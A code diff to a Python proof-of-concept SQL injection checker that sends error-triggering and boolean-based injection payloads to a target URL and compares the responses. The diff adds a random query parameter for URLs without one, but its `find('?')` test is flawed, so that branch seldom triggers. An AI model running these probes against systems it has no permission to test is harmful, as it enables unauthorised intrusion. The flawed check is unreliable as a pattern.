@@ -20,6 +20,7 @@ import re
 import random
 import os
 import sys
+import string
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
@@ -54,11 +55,17 @@ class poc:
         self.result_text = ""
         self.proxies = proxies
 
+    def generate_random_string(self):
+        letters = string.ascii_letters
+        return ''.join(random.choice(letters) for _ in range(8))
+
     def sqlcheck(self):
         try:
             if not self.url.find("?"):
-                return False
-            _url = self.url + "%29%28%22%27"
+                url = self.url + "?" + self.generate_random_string() + "=1"
+            else:
+                url = self.url
+            _url = url + "%29%28%22%27"
             content = requests.get(url=_url, headers=self.headers, verify=False, proxies=self.proxies)
             _content = content.text
             for (dbms, regex) in ((dbms, regex) for dbms in self.DBMS_ERRORS for regex in self.DBMS_ERRORS[dbms]):
@@ -69,10 +76,10 @@ class poc:
             content["origin"] = result_origin.text
             for test_payload in self.BOOLEAN_TESTS:
                 RANDINT = random.randint(1, 255)
-                _url = self.url + test_payload % (RANDINT, RANDINT)
+                _url = url + test_payload % (RANDINT, RANDINT)
                 result_true = requests.get(url=_url, headers=self.headers, verify=False, proxies=self.proxies)
                 content["true"] = result_true.text
-                _url = self.url + test_payload % (RANDINT, RANDINT + 1)
+                _url = url + test_payload % (RANDINT, RANDINT + 1)
                 result_false = requests.get(url=_url, headers=self.headers, verify=False, proxies=self.proxies)
                 content["false"] = result_false.text
                 if content["origin"] == content["true"] != content["false"]:
@@ -92,3 +99,4 @@ class poc:
             return self.result_text
         else:
             return False
+
